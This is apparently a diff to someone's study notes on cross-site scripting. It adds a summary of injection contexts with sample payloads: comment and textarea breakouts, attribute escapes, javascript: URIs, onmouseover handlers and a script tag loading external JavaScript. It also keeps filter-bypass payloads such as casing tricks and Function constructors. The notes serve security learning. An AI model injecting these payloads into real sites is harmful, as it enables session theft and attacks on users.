@@ -3,6 +3,18 @@
 - [HTB Advanced XSS and CSRF Exploitation Module](https://academy.hackthebox.com/module/235/section/2653)
 - [OWASP XSS](https://owasp.org/www-community/attacks/xss/)
 
+# Notes
+## Attacking and Exploiting Modern Web Applications (Kindle)
+Determine where your input is getting printed in the HTTP response we receive back:
+- Inside the head or body: Easy, just use your regular HTML tags like `<script>alert(1)</script>` or load an external script `<script src=https://onofri.org/security/xss.js></script>.`
+- If you are inside a comment, you have to escape out of the comment: `--><script>alert(1)</script>`
+- Same applies to `<textarea>` - we have to escape it first with `</textarea><script>alert(1)</script>`
+- If we are inside a HTMl attribute we can try terminate it right before our payload (vector). An attribute can be delimited by single or double quotes or whitespace. Then we close the tag and place our payload e.g `'><script>alert(1)</script>` or `"><script>alert(1)</script>`
+- If we can't escape out of an attribute we might be able to abuse it itself: e.g if we are in a `href` or `src` attribute we can use it directly with: `javascript:alert(1)` but each attribute/element might behave a little differently. And `"onmouseover="alert(1)` or  `'onmouseover='alert(1)` are valid for most.
+- If we're in JS code it depends where we are in the code, JS comments are `//`, it's line terminator is `;` and of course `'` + `"`
+
+
+
 ## XSS Filter Bypasses
 ### Weak Blacklists
 - Casing: `<ScRiPt>alert(1);</ScRiPt>`
@@ -27,6 +39,10 @@
 - setInterval: `setInterval("alert(1)")`
 - Function: `Function("alert(1)")()`
 - constructor: `[].constructor.constructor(alert(1))()`
+
+---
+
+
 
 ---
 
